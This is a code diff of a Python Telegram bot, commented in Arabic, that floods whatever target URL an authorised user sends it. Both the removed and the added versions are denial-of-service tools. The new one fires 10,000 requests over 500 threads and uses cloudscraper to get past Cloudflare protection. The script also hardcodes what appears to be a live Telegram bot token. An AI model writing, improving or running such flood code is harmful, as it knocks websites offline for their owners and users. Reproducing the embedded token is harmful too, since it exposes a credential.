@@ -1,107 +1,64 @@
-import aiohttp
-import asyncio
-import logging
-import time
 import telebot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
+import cloudscraper
+import threading
+from concurrent.futures import ThreadPoolExecutor
+import urllib3
+import time
 
-# إعداد السجلات
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+# تعطيل التحقق من صحة شهادة SSL
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# متغير لتخزين عدد البايتات المنقولة
-bytes_transferred = 0
-lock = asyncio.Lock()
+scraper = cloudscraper.create_scraper()  # إنشاء كائن scraper لتجاوز Cloudflare
+headers = {
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
+}
 
-# متغير لإيقاف الهجوم
-stop_attack_event = asyncio.Event()
-
-# قائمة المالكين
+# قائمة المالكين والمستخدمين
 Owner = ['6358035274']
 NormalUsers = []
 
-# قراءة القوائم من الملفات
-def load_lists():
-    global Owner, NormalUsers
+# استبدل 'YOUR_TOKEN_HERE' بالرمز الخاص بك من BotFather
+bot = telebot.TeleBot('7317402155:AAHNB3hgGqKXiLqF1OhTYLG78HmTlm8dYI4')
+
+def attack(url):
     try:
-        with open('owner.txt', 'r') as file:
-            Owner = file.read().splitlines()
-        with open('normal_users.txt', 'r') as file:
-            NormalUsers = file.read().splitlines()
-    except FileNotFoundError:
-        logging.warning("لم يتم العثور على ملفات القوائم. سيتم استخدام القوائم الفارغة.")
-        pass
-
-load_lists()
-
-# دالة الهجوم
-async def attack(session, url):
-    global bytes_transferred
-    while not stop_attack_event.is_set():
-        try:
-            async with session.get(url) as response:
-                content = await response.read()
-                async with lock:
-                    bytes_transferred += len(content)
-                logging.info(f"تم إرسال الطلب إلى: {url}")
-        except Exception as e:
-            logging.error(f"حدث خطأ: {e}")
-
-# بدء الهجوم
-async def start_attack(url):
-    stop_attack_event.clear()
-    async with aiohttp.ClientSession() as session:
-        tasks = [asyncio.create_task(attack(session, url)) for _ in range(5000)]
-        await asyncio.gather(*tasks)
-
-# إيقاف الهجوم
-def stop_attack():
-    stop_attack_event.set()
-    logging.info("تم إيقاف الهجوم.")
-
-# حساب سرعة النقل
-async def calculate_speed():
-    global bytes_transferred
-    while not stop_attack_event.is_set():
-        await asyncio.sleep(1)
-        async with lock:
-            speed = bytes_transferred / (1024 * 1024)  # تحويل البايتات إلى ميغابايت
-            bytes_transferred = 0
-        logging.info(f"سرعة النقل: {speed:.2f} MB/s")
-
-# إنشاء البوت باستخدام التوكن الخاص بك
-TOKEN = '7317402155:AAHNB3hgGqKXiLqF1OhTYLG78HmTlm8dYI4'
-bot = telebot.TeleBot(TOKEN)
-
-# تحقق من صحة المالك
-def is_owner(user_id):
-    return str(user_id) in Owner
+        response = scraper.get(url, headers=headers)  # استخدام scraper بدلاً من requests
+        print("تم إرسال الطلب إلى:", url)
+    except Exception as e:
+        print("حدث خطأ:", e)
 
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
-    if is_owner(message.from_user.id):
-        bot.reply_to(message, "مرحبًا بك في بوت ديابلو! استخدم القائمة أدناه لاختيار الأوامر.")
-        # إنشاء الأزرار التفاعلية إذا كان المستخدم مالكًا
-        markup = InlineKeyboardMarkup()
-        markup.add(InlineKeyboardButton("إضافة مستخدم", callback_data="add_user"))
-        markup.add(InlineKeyboardButton("إزالة مستخدم", callback_data="remove_user"))
-        markup.add(InlineKeyboardButton("بدء هجوم", callback_data="start_attack"))
-        markup.add(InlineKeyboardButton("إيقاف الهجوم", callback_data="stop_attack"))
-        bot.send_message(message.chat.id, "اختر أحد الأوامر:", reply_markup=markup)
+    bot.reply_to(message, "مرحباً! أرسل لي رابط الهدف للبدء في الهجوم.")
+
+@bot.message_handler(func=lambda message: True)
+def handle_message(message):
+    if str(message.chat.id) in Owner or str(message.chat.id) in NormalUsers:
+        url = message.text
+        start_time = time.time()  # بدء المؤقت
+
+        # زيادة عدد الخيوط
+        max_workers = 500  # يمكنك تعديل هذا الرقم بناءً على قدرة جهازك والهدف
+        num_requests = 10000  # يمكنك أيضاً تعديل عدد الطلبات
+
+        with ThreadPoolExecutor(max_workers=max_workers) as executor:
+            for _ in range(num_requests):
+                executor.submit(attack, url)
+
+        end_time = time.time()  # انتهاء المؤقت
+
+        # حساب الزمن المستغرق
+        elapsed_time = end_time - start_time
+
+        # حساب نسبة الإرسال بالطلبات في الثانية
+        requests_per_second = num_requests / elapsed_time
+        bot.reply_to(message, f"نسبة إرسال الطلبات: {requests_per_second:.2f} طلب/ثانية")
+
+        # استخدام session
+        response = scraper.get(url, headers=headers)  # استخدام scraper بدلاً من requests
+        bot.reply_to(message, response.text)
     else:
-        bot.reply_to(message, "أنت لا تملك الصلاحيات الكافية لاستخدام هذا البوت.")
+        bot.reply_to(message, "عذراً، أنت غير مصرح لك باستخدام هذه الأداة.")
 
-@bot.callback_query_handler(func=lambda call: is_owner(call.message.chat.id))
-def callback_query(call):
-    if call.data == "start_attack":
-        # بدء الهجوم في حلقة asyncio
-        asyncio.run(start_attack('http://example.com'))  # استبدل URL بالهدف الحقيقي
-    elif call.data == "stop_attack":
-        stop_attack()
-
-# تشغيل حساب سرعة النقل في حلقة asyncio
-async def main():
-    await calculate_speed()
-
-# بدء حلقة asyncio
-if __name__ == "__main__":
-    asyncio.run(main())
+bot.polling()
